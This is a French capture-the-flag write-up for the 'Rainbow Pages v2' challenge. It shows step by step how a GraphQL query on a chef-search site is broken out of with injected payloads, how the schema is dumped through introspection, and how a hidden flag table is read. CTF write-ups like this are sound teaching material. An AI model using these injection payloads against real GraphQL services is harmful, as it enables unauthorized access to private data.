# Rainbow Pages v2

**500 points**

## Enoncé

La première version de notre plateforme de recherche de cuisiniers présentait quelques problèmes de sécurité. Heureusement, notre développeur ne compte pas ses heures et a corrigé l'application en nous affirmant que plus rien n'était désormais exploitable. Il en a également profiter pour améliorer la recherche des chefs.

Pouvez-vous encore trouver un problème de sécurité ?

## Ma solution

J'utilise BurpSuite Community pour ce challenge.
Je commence par me demander quelle est la forme de la requête GraphQL. Je vois qu'en entrant des caractères erronés, l'erreur semble dupliquée : on a 2 points d'injection.
Je remarque aussi que les résultats de nos recherches correspondent au nom OU prénom des gens.
En prenant exemple sur RainbowPages 1, je suppose que la query est (sur une seule ligne):
```JSON
{
	allCooks (filter: {or:[ {firstname: {like: "%_____%"}}, {lastname: {like: "%_____%"}}]}) {
		nodes {
			firstname,
			lastname,
			speciality,
			price
		}
	}
}
```
On peut donc injecter le payload `"}}]}) {nodes { firstname }}} #` (# permet de faire des commentaires en GraphQL) pour vérifier cette supposition, et on obtient un résultat valide : la forme est bonne !
On regarde le schema de la base de données : `"}}]}) {nodes { firstname }} __schema { types {name} }} #`
```JSON
"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"Int"},
{"name":"Cursor"},{"name":"CooksOrderBy"},{"name":"CookCondition"},{"name":"String"},
{"name":"CookFilter"},{"name":"IntFilter"},{"name":"Boolean"},{"name":"StringFilter"},
{"name":"CooksConnection"},{"name":"Cook"},{"name":"CooksEdge"},{"name":"PageInfo"},
{"name":"FlagNotTheSameTableNamesOrderBy"},{"name":"FlagNotTheSameTableNameCondition"},
{"name":"FlagNotTheSameTableNameFilter"},{"name":"FlagNotTheSameTableNamesConnection"},
{"name":"FlagNotTheSameTableName"},{"name":"FlagNotTheSameTableNamesEdge"},{"name":"__Schema"},
{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},
{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```
Maintenant, on essaie d'obtenir le flag : on essaie la requête `flagNotTheSameTableNamesOrderBy`,
l'erreur nous aiguille (`did you mean flagNotTheSameTableNameById ?`) vers la requête `flagNotTheSameTableNameById`.
On obtient le `nodeId` de l'élément d'indice 1 avec la requête : `"}}]}) {nodes { firstname }} query { flagNotTheSameTableNameById(id:1) { nodeId }}} #`
La réponse nous donne
```JSON
"query":{"flagNotTheSameTableNameById":{"nodeId":"WyJmbGFnX25vdF90aGVfc2FtZV90YWJsZV9uYW1lcyIsMV0="}}}}
```
En le décodant en base64, on obtient `["flag_not_the_same_table_names",1]`
On teste les indices autour; rien de probant.

Maintenant on tente une requête vers ce nouveau nom :

`"}}]}) {nodes { firstname }} query { flagNotTheSameTableName(nodeId:"WyJmbGFnX25vdF90aGVfc2FtZV90YWJsZV9uYW1lcyIsMV0=") { flag_not_the_same_table_names} }} #`

L'erreur nous redirige vers la requête finale :

`"}}]}) {nodes { firstname }} query { flagNotTheSameTableName(nodeId:"WyJmbGFnX25vdF90aGVfc2FtZV90YWJsZV9uYW1lcyIsMV0=") { flagNotTheSameFieldName } }} #`

qui nous **sortira le flag !**
